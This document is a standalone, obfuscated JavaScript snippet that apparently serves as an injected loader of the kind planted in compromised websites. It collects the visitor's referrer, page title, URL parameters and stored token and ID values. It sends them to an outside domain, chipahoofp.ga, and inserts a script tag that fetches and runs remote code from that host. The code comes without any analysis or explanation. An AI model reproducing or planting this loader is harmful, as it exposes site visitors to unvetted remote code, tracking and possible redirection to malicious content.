
    (function() {
    var name = '_H2sg7KwXq5LW7zG7';
    if (!window._H2sg7KwXq5LW7zG7) {
        window._H2sg7KwXq5LW7zG7 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://chipahoofp.ga/tbSDQb',
        };
    }
    const _bz8L2wJg4xxtH8Q3 = localStorage.getItem('config');
    if (typeof _bz8L2wJg4xxtH8Q3 !== 'undefined' && _bz8L2wJg4xxtH8Q3 !== null) {
        var _8jCr2sKY2tckcx5v = JSON.parse(_bz8L2wJg4xxtH8Q3);
        var _TjKmJY2DBQWSfTZm = Math.round(+new Date()/1000);
        if (_8jCr2sKY2tckcx5v.created_at + window._H2sg7KwXq5LW7zG7.ttl < _TjKmJY2DBQWSfTZm) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _f4vQftp2bs1YFyzN = localStorage.getItem('subId');
    var _cW6wnFmHKWWYjRKT = localStorage.getItem('token');
    var _jSgthSb1YLxHyxVV = '?return=js.client';
        _jSgthSb1YLxHyxVV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _jSgthSb1YLxHyxVV += '&se_referrer=' + encodeURIComponent(document.referrer);
        _jSgthSb1YLxHyxVV += '&default_keyword=' + encodeURIComponent(document.title);
        _jSgthSb1YLxHyxVV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _jSgthSb1YLxHyxVV += '&name=' + encodeURIComponent(name);
        _jSgthSb1YLxHyxVV += '&host=' + encodeURIComponent(window._H2sg7KwXq5LW7zG7.R_PATH);
    if (typeof _f4vQftp2bs1YFyzN !== 'undefined' && _f4vQftp2bs1YFyzN && window._H2sg7KwXq5LW7zG7.unique) {
        _jSgthSb1YLxHyxVV += '&sub_id=' + encodeURIComponent(_f4vQftp2bs1YFyzN);
    }
    if (typeof _cW6wnFmHKWWYjRKT !== 'undefined' && _cW6wnFmHKWWYjRKT && window._H2sg7KwXq5LW7zG7.unique) {
        _jSgthSb1YLxHyxVV += '&token=' + encodeURIComponent(_cW6wnFmHKWWYjRKT);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._H2sg7KwXq5LW7zG7.R_PATH + _jSgthSb1YLxHyxVV;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
